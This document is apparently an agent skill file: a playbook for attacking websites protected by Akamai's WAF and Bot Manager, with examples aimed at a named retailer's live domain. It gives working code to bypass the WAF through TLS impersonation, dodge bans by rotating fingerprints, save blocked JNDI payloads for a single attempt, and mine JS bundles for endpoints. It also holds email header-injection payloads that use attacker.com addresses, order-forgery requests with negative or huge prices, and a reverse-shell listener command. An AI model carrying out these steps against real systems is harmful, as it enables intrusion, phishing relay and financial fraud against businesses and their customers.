---
name: akamai-exploitation
description: Use when target sits behind Akamai WAF or sets _abck cookie.
---

# Akamai WAF & Bot-Manager Playbook

Derived from authorized testing against an Akamai-fronted Java (Spring Boot) retail platform. Akamai has **two independent blocking gates**, each requiring a different counter.

## Gate 1: Content WAF — TLS Impersonation Bypass

Akamai rejects plain curl/wget/urllib immediately (empty body, 403, or Access-Denied page). The same endpoints pass when the request resembles a real browser at the TLS fingerprint layer, via `curl_cffi`.

```bash
pip install --break-system-packages curl_cffi
```

```python
from curl_cffi import requests as r
# Rotate the profile every 2-3 requests. Working profiles:
#   chrome110, chrome119, chrome107, chrome116, chrome120, safari17_0, safari15_3, edge99
s = r.Session(impersonate='chrome110', verify=False)
resp = s.get('https://www.rei.com/rest/version', headers={'Accept':'application/json'}, timeout=10)
if resp.status_code == 200: print('Bypass confirmed')
```

## Rate-Limit Discipline (Empirically Measured)

Each TLS profile tolerates roughly **3-5 state-changing POSTs** before Akamai issues a ban (403 or timeout on all paths, GETs included). Bans expire in **3-5 minutes**; hard bans up to 10.

**Protocol that worked:**
1. **Canary GET first** — proceed only when the cheap reference GET returns 200 with expected body.
2. **Keep every batch ≤ 6 requests** — sleep 1-3s between calls (2s sweet spot).
3. **Rotate TLS profile between requests**.
4. **On 403, STOP immediately** — retrying at a blocked IP extends the ban. Wait ≥ 60s and re-canary.
5. A batch that throws mid-flight may still consume quota; re-verify canary after resume.

## WAF Pattern Learning

Once Akamai sees a payload pattern once, it blocks it everywhere afterward — body, query string, path, and cookies alike. Observed fully-blocked-after-learning set:
- `${`, `}`, `${jndi:`, `jndi:` + anything, `ldap://`, `rmi://`, `dns://`, `://`, `env:`, `sys`, `java`

**Encodings the WAF DOES inspect (no bypass help):** URL-encode, double-encode, unicode escapes (`\u0024\u007b`), GZIP bodies.

**Encodings the WAF does NOT inspect:** Base64 bodies slip past WAF inspection — but the backend doesn't decode them either, so this alone yields no eval.

**Practical implication:** burn a sensitive payload ONCE, on the highest-value endpoint, after warm-up. Never retry the same chain twice.

## Gate 2: Bot Manager (`_abck` cookie)

Akamai Bot Manager gates only SOME paths — typically classic server-rendered form posts (`POST /user/login`) — while leaving REST API endpoints (`POST /rest/user`) alone.

### Distinguish the two 403 flavors

| Flavor | Trigger | Cookie signature |
|--------|---------|------------------|
| Content WAF 403 | Pattern-based, path-specific, cookie-independent | No new cookie in `Set-Cookie` |
| Bot Manager 403 | Form-post paths only; GET 200s fine on same host | Fresh obfuscated challenge cookie (e.g. `qqZ5m26Q`) in `Set-Cookie` |

**`_abck` tail `~-1~-1~-1`** = no valid sensor data (curl_cffi cannot solve). Valid sensor strings differ after real browser JS runs.

**curl_cffi cannot pass Akamai Bot Manager.** Workarounds:
- Use the equivalent REST endpoint when one exists (e.g. REST `POST /rest/user` for register/login vs blocked classic `POST /user/login`).
- Consider a real browser session for exactly that one form submission.
- Do NOT loop retries — each retry burns the IP faster.

## 403 / 404 / 400 / 405 Triage on Akamai-Fronted Backends

| Status | Meaning | Next step |
|--------|---------|-----------|
| 403 + Access-Denied HTML | Path exists but WAF-blocked | Check app SPA traffic to confirm path is real |
| 404 + static HTML (same size every miss) | Likely absent path or catch-all | Verify via SPA JS bundle before concluding |
| 400 + JSON errors ("must not be empty") | Endpoint exists for sure | Iterate required fields |
| 405 | Right route, wrong method | Try GET → POST → PUT |
| 500 | Server processing error | May leak internals |

## Registration/Login Field Discovery (Progressive Validation Probing)

Spring Boot registration endpoints typically use FORM parameters (not JSON), even if they `Accept` JSON. Discover required fields by iterating 400 responses:

```
Step 1: POST with partial fields
POST /rest/user
Content-Type: application/x-www-form-urlencoded
logonPassword=Test123!

→ 400 with JSON error listing ALL missing fields:
   {"error":[{"message":"must not be empty","parameterName":"form parameter: lastName"},...]}

Step 2: Add the missing fields, repeat.
Step 3: Repeat until 201 (or 409 if account exists).
```

**Common Spring field names** (empirically confirmed): `logonPassword`, `logonPasswordVerify`, `logonId`, `email`, `firstName`, `lastName`, `emp`, `memberType`, `isEmployee`, `isAdmin`.

**Mass assignment:** appending `role=admin`, `isAdmin=true` to registration is usually ignored (backend uses a strict form DTO) — test to confirm.

## Auth-Bypass: Registration IS Login

**Discovery confirmed:** SPA-backed Spring register endpoint `POST /rest/user` does not just create accounts — it ALSO issues a full authenticated session in the same response:

- `Set-Cookie: REI_DEVICE_ID=..., REI_SESSION_ID=..., REI_SSL_SESSION_ID=<JWT>, loggedin, reiToken1`

The same cookie jar then gets `200` on protected endpoints (`/rest/user`, `/rest/user/orders`). Common Spring behavior — register handler auto-logs in on success.

```python
s = r.Session(impersonate='chrome110', verify=False)
r1 = s.post('https://www.rei.com/rest/user',
    data='logonPassword=X&logonPasswordVerify=X&firstName=A&lastName=B&email=a@b.com&logonId=a@b.com',
    headers={'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json'},
    timeout=15)
# s.cookies now contains a valid auth session.
r2 = s.get('https://www.rei.com/rest/user', headers={'Accept':'application/json'}, timeout=10)
# isGuest=false → authenticated.
```

**Do not loop register with duplicate emails** — 409 "LogonId already in use" and no new session. Always generate fresh unique emails for continued testing.

## Endpoint Discovery from SPA Bundles

When the HTML shell gives you nothing, the JS bundles hold the full API surface. From the main bundle (`index-*.js`), extract every path-like string:

```python
import re
js = open('/tmp/bundle.js', encoding='utf-8', errors='ignore').read()

paths = set()
for m in re.findall(r'["`\'](/[^"\'`\n]{3,120})["`\']', js):
    clean = m.replace('${e}', 'REPLACE_ID').replace('${t}', 'true').rstrip('\\')
    if any(kw in clean for kw in ['used','rest','order','api','trade','item','store','email','search','checkout']):
        paths.add(clean)
print('\n'.join(sorted(paths)))
```

Resolve `${...}` placeholders with plausible values (product IDs, member IDs, category slugs) and batch-test each.

**Priority order:**
1. POST endpoints with JSON bodies (`/order/audit`, `/emails/v1/confirmation`) — 202/201 confirm live.
2. GET endpoints returning full data without auth (`/item/{id}`, `/store/{id}/eligibility`) — check IDOR.
3. REST endpoints expecting values (`/purchaseHistory/member/{id}`) — 401 shows the auth gate.

## Email Header Injection via Unauthenticated Endpoint

Many B2B/retail flows expose an internal email endpoint that does NOT require auth (e.g. trade-in confirmation email). Header injections via newline in the email field:

```python
payloads = [
    '{"email":"test@test.com\\nBCC:victim@attacker.com","orderId":"1"}',
    '{"email":"test@test.com\\r\\nBCC: victim@attacker.com","orderId":"1"}',
    '{"email":"test@test.com\\nCC:victim@attacker.com","orderId":"1"}',
    '{"email":"test@test.com\\nSubject:PWNED"}',
    '{"email":"test@test.com\\nReply-To:attacker@evil.com"}',
]
# All typically return 202 QUEUED without error.
```

**Impact:** attacker can send phishing emails using the target's own domain as relay. Even when the real victim's inbox never receives these (internal SMTP filter), the injection is confirmed when Akamai 202s the header injection and/or the `202 QUEUED` response leaks business logic.

## Order Forgery / Business-Logic Abuse

Retail trade-in/order endpoints often accept a numeric `tradeInPrice` without lower/upper-bound validation:

```python
payloads = [
    {"items": [{"itemId": "880001", "tradeInPrice": -1, "quantity": 1}], "storeId": "11"},          # NEGATIVE
    {"items": [{"itemId": "880001", "tradeInPrice": 999999999999, "quantity": 1}], "storeId": "11"}, # OVERFLOW
]
# Both return 200 with totalOrder matching the malicious value AND a fresh orderNo per request.
```

Negative = credit; large = financial damage.

## Retry Discipline

- After any 500 or Akamai anomaly, do not retry immediately. Wait 5-10 seconds.
- Keep reverse-shell listener alive BEFORE the exploit wave (`nc -lvnp 9999 &`).
- If a batch exhausts an account/limit, register a fresh account (unique email) instead of reusing.
